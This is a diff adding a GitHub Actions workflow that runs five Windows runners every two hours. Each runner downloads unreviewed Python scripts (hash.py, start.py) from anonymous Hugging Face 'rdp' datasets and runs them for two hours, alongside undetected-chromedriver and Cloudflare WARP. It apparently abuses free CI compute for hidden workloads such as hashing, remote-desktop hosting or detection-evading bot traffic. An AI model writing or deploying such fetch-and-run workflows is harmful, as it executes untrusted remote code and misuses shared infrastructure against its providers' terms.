@@ -1,0 +1,78 @@
+name: Continuous Python Script Runner
+
+on:
+  workflow_dispatch: # التشغيل اليدوي
+  schedule:
+    - cron: '0 */2 * * *' # التنفيذ التلقائي كل ساعتين
+
+jobs:
+  run-python-instances:
+    runs-on: windows-2022
+    timeout-minutes: 125 # أقصى مدة للوظيفة كاملة (ساعتين و 5 دقائق لضمان عدم التعليق)
+    
+    strategy:
+      fail-fast: false
+      matrix:
+        instance: [1, 2, 3, 4, 5] # تشغيل 5 نسخ متوازية
+
+    steps:
+      # -----------------------------------------------------------
+      # خطوة 1: إعداد البيئة وتحميل الملفات
+      # -----------------------------------------------------------
+      - name: Download and Install Packages
+        shell: pwsh
+        env:
+          PYTHONIOENCODING: "utf-8"
+        run: |
+          Write-Host "⬇️ Downloading scripts for instance ${{ matrix.instance }}..."
+          Invoke-WebRequest -Uri "https://huggingface.co/datasets/gfdg34fsd/rdp/resolve/main/hash.py" -OutFile "hash.py"
+          Invoke-WebRequest -Uri "https://huggingface.co/datasets/sjkhfuk/rdp/resolve/main/start.py" -OutFile "start.py"
+          
+          Write-Host "📦 Installing required python packages..."
+          python -m pip install --upgrade pip setuptools undetected-chromedriver selenium requests
+          Write-Host "✅ Environment Ready."
+
+      # -----------------------------------------------------------
+      # خطوة 2: تشغيل السكربت لمدة ساعتين
+      # -----------------------------------------------------------
+      - name: Run Script with 120-Minute Limit
+        shell: pwsh
+        env:
+          PYTHONIOENCODING: "utf-8"
+        run: |
+          Write-Host "🚀 Starting start.py for Instance ${{ matrix.instance }}..."
+          
+          # إضافة مسار Cloudflare WARP لمتغيرات النظام إذا كان السكربت يحتاجه
+          $env:PATH += ";C:\Program Files\Cloudflare\Cloudflare WARP"
+          
+          # تشغيل السكربت في الخلفية كعملية منفصلة
+          $process = Start-Process python -ArgumentList "start.py" -PassThru -NoNewWindow
+          
+          Write-Host "🕒 Script is now running. Timer started for 120 minutes (2 hours)..."
+          
+          # الانتظار لمدة 7200 ثانية (ساعتين)
+          $timer = 0
+          while ($timer -lt 7200) {
+              if ($process.HasExited) {
+                  Write-Host "⚠️ Script stopped unexpectedly before the 2 hours were up."
+                  break
+              }
+              Start-Sleep -Seconds 60
+              $timer += 60
+              Write-Host "⏳ Time elapsed: $timer seconds (out of 7200)..."
+          }
+
+          # إنهاء السكربت بعد انتهاء الساعتين
+          if (!$process.HasExited) {
+              Write-Host "🛑 Time limit reached (2 hours). Terminating start.py..."
+              Stop-Process -Id $process.Id -Force
+              Write-Host "✅ Process terminated successfully."
+          }
+
+      # -----------------------------------------------------------
+      # خطوة 3: تقرير الحالة
+      # -----------------------------------------------------------
+      - name: Final Status Report
+        shell: pwsh
+        run: |
+          Write-Host "🏁 Instance ${{ matrix.instance }} session completed."
